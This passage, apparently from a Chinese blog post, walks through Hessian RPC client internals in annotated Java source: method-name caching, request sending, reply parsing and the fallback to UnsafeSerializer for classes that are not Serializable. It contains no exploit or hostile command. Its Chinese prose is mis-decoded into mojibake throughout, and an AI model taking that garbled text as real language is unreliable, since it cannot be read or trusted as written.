<p>é¦–å…ˆè·å–äº†æ–¹æ³•åå’Œæ–¹æ³•å‚æ•°ç±»å‹ï¼Œå°†æ–¹æ³•å’Œæ–¹æ³•åæ”¾å…¥ <code>_mangleMap</code>ï¼Œä¸‹æ¬¡è°ƒç”¨ä¼šé¦–å…ˆä» <code>_mangleMap</code> è·å–æ–¹æ³•åã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä»æ–¹æ³•åç¼“å­˜ä¸­è¯»å–å·²è®¡ç®—è¿‡çš„â€œæ–¹æ³•åç¼–ç â€ï¼ˆmangleNameï¼‰</span></span><br><span class="line"><span class="comment">// è¿™é‡Œå¯¹ _mangleMap åšåŒæ­¥ï¼Œé¿å…å¤šçº¿ç¨‹ä¸‹å¹¶å‘è®¿é—®é—®é¢˜</span></span><br><span class="line"><span class="keyword">synchronized</span> (_mangleMap) &#123;</span><br><span class="line">    mangleName = _mangleMap.get(method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mangleName == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// è¿˜æ²¡æœ‰ç¼“å­˜ï¼šå¼€å§‹æ ¹æ®åå°„ä¿¡æ¯è®¡ç®—</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] params = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// equals å’Œ hashCode æ˜¯ç‰¹æ®Šå¤„ç†ï¼ˆä¸ Java è¯­ä¹‰ä¿æŒä¸€è‡´ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)</span><br><span class="line">            &amp;&amp; params.length == <span class="number">1</span> &amp;&amp; params[<span class="number">0</span>].equals(Object.class)) &#123;</span><br><span class="line">        <span class="comment">// equals(Object obj) çš„è¿œç«¯è¯­ä¹‰ï¼š</span></span><br><span class="line">        <span class="comment">// åªæœ‰å½“å¯¹æ–¹ä¹Ÿæ˜¯ JDK åŠ¨æ€ä»£ç†ï¼Œä¸”å…¶ InvocationHandler ä¸º HessianProxyï¼Œ</span></span><br><span class="line">        <span class="comment">// ä¸”ä¸¤è€… URL ç›¸åŒï¼Œæ‰è®¤ä¸ºç›¸ç­‰</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span> || !Proxy.isProxyClass(value.getClass()))</span><br><span class="line">            <span class="keyword">return</span> Boolean.FALSE;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxyHandler</span> <span class="operator">=</span> Proxy.getInvocationHandler(value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(proxyHandler <span class="keyword">instanceof</span> HessianProxy))</span><br><span class="line">            <span class="keyword">return</span> Boolean.FALSE;</span><br><span class="line"></span><br><span class="line">        <span class="type">HessianProxy</span> <span class="variable">handler</span> <span class="operator">=</span> (HessianProxy) proxyHandler;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ³¨æ„ï¼šè¿™é‡ŒæŒ‰ URL ç›¸ç­‰æ¥å®šä¹‰è¿œç«¯â€œèº«ä»½ä¸€è‡´æ€§â€</span></span><br><span class="line">        <span class="comment">// æ—§å†™æ³•ä½¿ç”¨ new Boolean(...)ï¼Œä¿æŒåŸæ ·</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Boolean</span>(_url.equals(handler.getURL()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>) &amp;&amp; params.length == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// hashCode ä¸ equals ä¿æŒä¸€è‡´æ€§ï¼šç”¨ URL çš„ hashCode</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(_url.hashCode());</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;getHessianType&quot;</span>))</span><br><span class="line">        <span class="comment">// Hessian æ‰©å±•ï¼šè¿”å›ä¸šåŠ¡æ¥å£åï¼ˆé€šå¸¸æ˜¯ä»£ç†å®ç°çš„ç¬¬ä¸€ä¸ªæ¥å£ï¼‰</span></span><br><span class="line">        <span class="keyword">return</span> proxy.getClass().getInterfaces()[<span class="number">0</span>].getName();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;getHessianURL&quot;</span>))</span><br><span class="line">        <span class="comment">// Hessian æ‰©å±•ï¼šè¿”å›è¿œç«¯ URL å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">return</span> _url.toString();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>) &amp;&amp; params.length == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// ä¾¿äºè°ƒè¯•çš„å­—ç¬¦ä¸²è¡¨ç¤º</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;HessianProxy[&quot;</span> + _url + <span class="string">&quot;]&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿›å…¥æ–¹æ³•åâ€œç¼–ç â€å†³ç­–ï¼š</span></span><br><span class="line">    <span class="comment">// - å¦‚æœæœªå¯ç”¨é‡è½½ï¼ˆoverloadï¼‰ï¼Œåªç”¨æ–¹æ³•å</span></span><br><span class="line">    <span class="comment">// - å¦‚æœå¯ç”¨é‡è½½ï¼Œéœ€è¦æŠŠå‚æ•°ç­¾åä¹Ÿç¼–ç è¿›å»ï¼Œé¿å…é‡åæ–¹æ³•æ­§ä¹‰</span></span><br><span class="line">    <span class="keyword">if</span> (!_factory.isOverloadEnabled())</span><br><span class="line">        mangleName = method.getName();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mangleName = mangleName(method); <span class="comment">// ç”Ÿæˆå¸¦ç­¾åçš„ç¼–ç å</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»“æœå†™å›ç¼“å­˜ï¼Œé¿å…ä¸‹æ¬¡é‡å¤è®¡ç®—</span></span><br><span class="line">    <span class="keyword">synchronized</span> (_mangleMap) &#123;</span><br><span class="line">        _mangleMap.put(method, mangleName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹‹åå‘é€è¯·æ±‚è·å–è¿æ¥å¯¹è±¡ï¼Œè¯»å–åè®®æ ‡å¿— <code>code</code>ï¼Œæ ¹æ®åè®®æ ‡å¿—é€‰æ‹©ä½¿ç”¨ <code>Hessian/Hessian2</code> è¯»å–ï¼Œæœ€ç»ˆæ–­å¼€è¿æ¥ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‘èµ·è¯·æ±‚å¹¶æ‹¿åˆ°è¿æ¥ä¸è¾“å…¥æµ</span></span><br><span class="line">conn = sendRequest(mangleName, args);</span><br><span class="line">is = getInputStream(conn);</span><br><span class="line"></span><br><span class="line"><span class="comment">// FINEST çº§åˆ«ä¸‹ï¼Œç”¨è°ƒè¯•è¾“å…¥æµæŠŠ Hessian åŸå§‹å­—èŠ‚æ‰“å°åˆ°æ—¥å¿—</span></span><br><span class="line"><span class="keyword">if</span> (log.isLoggable(Level.FINEST)) &#123;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">dbg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">LogWriter</span>(log));</span><br><span class="line">    <span class="type">HessianDebugInputStream</span> <span class="variable">dIs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianDebugInputStream</span>(is, dbg);</span><br><span class="line">    dIs.startTop2(); <span class="comment">// æ ‡è®°ä¸º Hessian 2 é¡¶å±‚ç»“æ„ï¼Œä¾¿äºè§£ææ‰“å°</span></span><br><span class="line">    is = dIs;        <span class="comment">// ç”¨è°ƒè¯•åŒ…è£…æµæ›¿æ¢åŸå§‹è¾“å…¥æµ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">AbstractHessianInput in;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»å–åè®®é¦–å­—èŠ‚ï¼Œå†³å®šä½¿ç”¨ Hessian2 è¿˜æ˜¯ Hessian 1.x è§£æ</span></span><br><span class="line"><span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> is.read();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (code == <span class="string">&#x27;H&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// Hessian 2.0 å“åº”å¤´ï¼š&#x27;H&#x27; + major + minor</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">major</span> <span class="operator">=</span> is.read();</span><br><span class="line">    <span class="type">int</span> <span class="variable">minor</span> <span class="operator">=</span> is.read();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»º Hessian2 è§£ç å™¨</span></span><br><span class="line">    in = _factory.getHessian2Input(is);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŒ‰æ–¹æ³•è¿”å›ç±»å‹ååºåˆ—åŒ–å›å¤å†…å®¹</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> in.readReply(method.getReturnType());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è‹¥ä¸ºæµå¼è¿”å›ï¼ŒæŠŠè¿æ¥ä¸è¾“å…¥æµäº¤ç»™ ResultInputStream æ‰˜ç®¡ï¼Œè°ƒç”¨æ–¹è¯»å®Œå†å…³é—­</span></span><br><span class="line">    <span class="keyword">if</span> (value <span class="keyword">instanceof</span> InputStream) &#123;</span><br><span class="line">        value = <span class="keyword">new</span> <span class="title class_">ResultInputStream</span>(conn, is, in, (InputStream) value);</span><br><span class="line">        is = <span class="literal">null</span>;   <span class="comment">// é˜²æ­¢åç»­ finally æå‰å…³é—­</span></span><br><span class="line">        conn = <span class="literal">null</span>; <span class="comment">// é˜²æ­¢åç»­ finally æå‰å…³é—­</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// Hessian 1.x ï¼ˆHessian 1.0/1.1ï¼‰å›å¤å¤´ï¼š&#x27;r&#x27; + major + minor</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">major</span> <span class="operator">=</span> is.read();</span><br><span class="line">    <span class="type">int</span> <span class="variable">minor</span> <span class="operator">=</span> is.read();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»º Hessian 1.x è§£ç å™¨</span></span><br><span class="line">    in = _factory.getHessianInput(is);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿›å…¥å›å¤ä½“è¯»å–é˜¶æ®µï¼ˆHessian 1.x éœ€è¦å…ˆæ˜¾å¼å¼€å§‹/ç»“æŸï¼‰</span></span><br><span class="line">    in.startReplyBody();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ååºåˆ—åŒ–ä¸ºç›®æ ‡è¿”å›ç±»å‹</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> in.readObject(method.getReturnType());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (value <span class="keyword">instanceof</span> InputStream) &#123;</span><br><span class="line">        <span class="comment">// æµå¼è¿”å›ï¼šæŠŠèµ„æºç§»äº¤ç»™ç»“æœæµï¼Œç”±è°ƒç”¨æ–¹æ§åˆ¶å…³é—­</span></span><br><span class="line">        value = <span class="keyword">new</span> <span class="title class_">ResultInputStream</span>(conn, is, in, (InputStream) value);</span><br><span class="line">        is = <span class="literal">null</span>;</span><br><span class="line">        conn = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// éæµå¼è¿”å›ï¼šå®Œæ•´æ¶ˆè´¹å¹¶å…³é—­ reply bodyï¼Œä¿æŒæµè¾¹ç•Œä¸€è‡´</span></span><br><span class="line">        in.completeReply();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// æœªçŸ¥é¦–å­—èŠ‚ï¼šåè®®ä¸åŒ¹é…æˆ–å“åº”éæ³•</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HessianProtocolException</span>(<span class="string">&quot;&#x27;&quot;</span> + (<span class="type">char</span>) code + <span class="string">&quot;&#x27; is an unknown code&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sendRequest</code> é‡Œé™¤äº†å»ºç«‹ç½‘ç»œè¿æ¥å¤–ï¼Œè¿˜é€šè¿‡ <code>HessianOutput#call</code> æ¥åºåˆ—åŒ–æ–¹æ³•è°ƒç”¨å‚æ•°ï¼ˆ<code>HessianOutput#writeObject</code>ï¼‰</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">at com.caucho.hessian.io.SerializerFactory.getDefaultSerializer(SerializerFactory.java:382)</span><br><span class="line">at com.caucho.hessian.io.SerializerFactory.loadSerializer(SerializerFactory.java:368)</span><br><span class="line">at com.caucho.hessian.io.SerializerFactory.getSerializer(SerializerFactory.java:267)</span><br><span class="line">at com.caucho.hessian.io.HessianOutput.writeObject(HessianOutput.java:322)</span><br><span class="line">at com.caucho.hessian.io.HessianOutput.call(HessianOutput.java:132)</span><br><span class="line">at com.caucho.hessian.client.HessianProxy.sendRequest(HessianProxy.java:300)</span><br><span class="line">at com.caucho.hessian.client.HessianProxy.invoke(HessianProxy.java:171)</span><br><span class="line">at com.sun.proxy.$Proxy0.hi(Unknown Source:-1)</span><br></pre></td></tr></table></figure></div>

<p>åºåˆ—åŒ–é¦–å…ˆéœ€è¦æ ¹æ®å‚æ•°ç±»å‹è·å–å¯¹åº”çš„åºåˆ—åŒ–å™¨ã€‚å’Œè·å–ååºåˆ—åŒ–å™¨ä¸€æ ·ï¼Œè¿™é‡ŒåŒ¹é…ä¸åˆ°é¢„ç½®ç±»å‹ï¼Œåªèƒ½è·å–é»˜è®¤çš„åºåˆ—åŒ–å™¨ <code>UnsafeSerializer</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å°†ä»»æ„å¯¹è±¡å†™å…¥åˆ°è¾“å‡ºæµã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object è¦åºåˆ—åŒ–å†™å‡ºçš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException å†™å‡ºè¿‡ç¨‹ä¸­çš„ IO å¼‚å¸¸</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// Hessian åè®®çš„ç©ºå€¼å†™å‡ºï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªç©ºæ ‡è®°ï¼Œå¦‚ &#x27;N&#x27;ï¼‰ï¼Œå¹¶ç«‹å³è¿”å›</span></span><br><span class="line">    <span class="keyword">if</span> (object == <span class="literal">null</span>) &#123;</span><br><span class="line">        writeNull();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ®è¿è¡Œæ—¶ç±»å‹ä»åºåˆ—åŒ–å·¥å‚è·å–åˆé€‚çš„ Serializer</span></span><br><span class="line">    Serializer serializer;</span><br><span class="line"></span><br><span class="line">    serializer = _serializerFactory.getSerializer(object.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨è·å–åˆ°çš„ Serializer æ‰§è¡Œå®é™…å†™å‡ºï¼›</span></span><br><span class="line">    <span class="comment">// ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥å½“å‰è¾“å‡ºå¯¹è±¡ï¼ˆä½œä¸ºåºåˆ—åŒ–ä¸Šä¸‹æ–‡/ç›®æ ‡ï¼‰</span></span><br><span class="line">    serializer.writeObject(object, <span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åªè¦å¼€å¯ <code>_isAllowNonSerializable</code>ï¼Œæ²¡æœ‰å®ç° <code>Serializable</code> æ¥å£çš„ç±»ä¹Ÿèƒ½åºåˆ—åŒ–ã€‚è¿™ä¹Ÿæ˜¯å’ŒåŸç”Ÿååºåˆ—åŒ–çš„é‡å¤§åŒºåˆ«ä¹‹ä¸€ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¿”å›æœªè¢«ç›´æ¥åŒ¹é…åˆ°çš„ç±»çš„â€œé»˜è®¤åºåˆ—åŒ–å™¨â€ã€‚</span></span><br><span class="line"><span class="comment"> * åº”ç”¨å¯ä»¥è¦†å†™æœ¬æ–¹æ³•ï¼Œä»¥ä¾¿ç”¨ bean é£æ ¼åºåˆ—åŒ–æ›¿ä»£å­—æ®µåºåˆ—åŒ–ç­‰ç­–ç•¥ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> cl  éœ€è¦è¢«åºåˆ—åŒ–å¯¹è±¡çš„ Class</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>    è¯¥ç±»çš„é»˜è®¤åºåˆ—åŒ–å™¨</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Serializer <span class="title function_">getDefaultSerializer</span><span class="params">(Class cl)</span> &#123;</span><br><span class="line">    <span class="comment">// è‹¥å¤–éƒ¨å·²é…ç½®äº†é»˜è®¤åºåˆ—åŒ–å™¨ï¼Œåˆ™ä¼˜å…ˆè¿”å›è¯¥å®ä¾‹</span></span><br><span class="line">    <span class="keyword">if</span> (_defaultSerializer != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> _defaultSerializer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è‹¥ç±»æœªå®ç° java.io.Serializable ä¸”æœªæ˜¾å¼å…è®¸é Serializableï¼Œåˆ™ç›´æ¥æ‹’ç»</span></span><br><span class="line">    <span class="keyword">if</span> (!Serializable.class.isAssignableFrom(cl)</span><br><span class="line">            &amp;&amp; !_isAllowNonSerializable) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">                <span class="string">&quot;Serialized class &quot;</span> + cl.getName() + <span class="string">&quot; must implement java.io.Serializable&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ç”¨ Unsafe åºåˆ—åŒ–ï¼Œä¸”ç±»æœªå®šä¹‰ writeReplace æ—¶ï¼Œèµ° Unsafe åˆ†æ”¯</span></span><br><span class="line">    <span class="comment">// ï¼ˆwriteReplace å­˜åœ¨æ—¶é€šå¸¸äº¤ç”± Java é£æ ¼åºåˆ—åŒ–å¤„ç†ä»¥ä¿æŒè¯­ä¹‰ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (_isEnableUnsafeSerializer</span><br><span class="line">            &amp;&amp; JavaSerializer.getWriteReplace(cl) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> UnsafeSerializer.create(cl);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å…¶ä½™æƒ…å†µä½¿ç”¨ Java é£æ ¼çš„åºåˆ—åŒ–å™¨</span></span><br><span class="line">        <span class="keyword">return</span> JavaSerializer.create(cl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>UnsafeSerializer</code> çš„æ„é€ å‡½æ•°ä¸­ä½¿ç”¨ <code>introspect()</code> è‡ªçœåºåˆ—åŒ–çš„ç±»ã€‚çœ‹åˆ°è¿™é‡Œåºåˆ—åŒ–ä¹Ÿè·³è¿‡äº† <code>static</code> å’Œ <code>transient</code> ä¿®é¥°çš„å­—æ®µï¼Œå¹¶ä¸”åŒæ ·ä¸ºæ¯ä¸ªå­—æ®µåˆ†é…å…¶åºåˆ—åŒ–å™¨ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é€šè¿‡åå°„æ”¶é›†ç±»åŠå…¶çˆ¶ç±»çš„å­—æ®µï¼Œå¹¶ä¸ºæ¯ä¸ªå­—æ®µå‡†å¤‡å¯¹åº”çš„ FieldSerializerã€‚</span></span><br><span class="line"><span class="comment"> * è§„åˆ™ï¼š</span></span><br><span class="line"><span class="comment"> * - è·³è¿‡ transient / static å­—æ®µ</span></span><br><span class="line"><span class="comment"> * - å…ˆæ”¶é›†â€œåŸå§‹/ç®€å•ç±»å‹â€ï¼ˆprimitive æˆ– java.lang.* ä½†ä¸å« Objectï¼‰ï¼Œå†æ”¶é›†å¤åˆç±»å‹</span></span><br><span class="line"><span class="comment"> *   è¿™æ ·å¯åœ¨åºåˆ—åŒ–æ—¶ä¼˜å…ˆå†™å‡ºç®€å•ç±»å‹</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">introspect</span><span class="params">(Class&lt;?&gt; cl)</span> &#123;</span><br><span class="line">    ArrayList&lt;Field&gt; primitiveFields = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Field&gt;();</span><br><span class="line">    ArrayList&lt;Field&gt; compoundFields = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Field&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‘ä¸Šéå†ç»§æ‰¿é“¾ï¼ŒåŒ…å«çˆ¶ç±»å­—æ®µ</span></span><br><span class="line">    <span class="keyword">for</span> (; cl != <span class="literal">null</span>; cl = cl.getSuperclass()) &#123;</span><br><span class="line">        Field[] fields = cl.getDeclaredFields();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> fields[i];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è·³è¿‡ transient / static å­—æ®µï¼ˆä¸å‚ä¸åºåˆ—åŒ–ï¼‰</span></span><br><span class="line">            <span class="keyword">if</span> (Modifier.isTransient(field.getModifiers())</span><br><span class="line">                    || Modifier.isStatic(field.getModifiers())) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * // <span class="doctag">XXX:</span> å¦‚éœ€ä»…å¤„ç† public å­—æ®µæˆ–å…è®¸è®¿é—®é public å­—æ®µï¼Œå¯å‚æ•°åŒ–æ§åˆ¶</span></span><br><span class="line"><span class="comment">             * field.setAccessible(true);</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ†ç±»ï¼š</span></span><br><span class="line">            <span class="comment">// 1) åŸå§‹ç±»å‹ï¼Œæˆ–ä½äº java.lang.*ï¼ˆå¦‚ String/Integer/Long 